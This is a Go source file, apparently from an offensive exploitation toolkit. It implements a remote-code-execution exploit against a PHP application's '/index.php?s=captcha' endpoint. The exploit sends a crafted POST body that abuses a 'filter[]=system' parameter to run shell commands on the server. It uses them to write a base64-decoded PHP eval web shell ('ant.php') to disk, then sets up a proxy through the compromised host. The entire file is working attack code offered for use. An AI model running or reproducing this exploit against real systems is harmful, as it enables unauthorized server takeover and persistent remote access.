package payload

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/jstang9527/gofor/src/share/proxy"
	"github.com/jstang9527/gofor/src/srv-exploit/files"
)

type VUL_2021_04272 struct {
	target string // "http://127.0.0.1:8080"
	uri    string // "/index.php?page=2&id=2"
	client *http.Client
	stype  files.ShellType
}

func NewVUL_2021_04272(target string) *VUL_2021_04272 {
	return &VUL_2021_04272{
		target: target,
		uri:    `/index.php?s=captcha`,
		client: &http.Client{Timeout: time.Second * 30},
		stype:  files.PHPWebShell,
	}
}

// 上传webshell(原理参考CVE-2017-10271)
func (r *VUL_2021_04272) Attack() (string, error) {
	content := base64.StdEncoding.EncodeToString([]byte(files.NewWebShell(r.stype).MenuDisplay()))
	api := fmt.Sprintf("%v%v", r.target, r.uri)
	fmt.Println(api) // PD9waHAgZXZhbCgkX1BPU1RbYW50XSk7ID8+

	cmdPerfix := url.PathEscape("echo ")
	cmdSuffix := url.PathEscape(" | base64 -d > ant.php")
	cmd := fmt.Sprintf("%v%v%v", cmdPerfix, strings.ReplaceAll(content, "+", "%2B"), cmdSuffix)
	body := `_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=` + cmd
	req, err := http.NewRequest("POST", api, bytes.NewBuffer([]byte(body)))
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en")
	req.Header.Set("Connection", "close")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := r.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	text, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	fmt.Println(string(text))
	return "/ant.php", nil
}

func (r *VUL_2021_04272) CreateProxy() (string, error) {
	return proxy.NewProxy(proxy.ProxyTypeHTTP, r.target).Run()
}
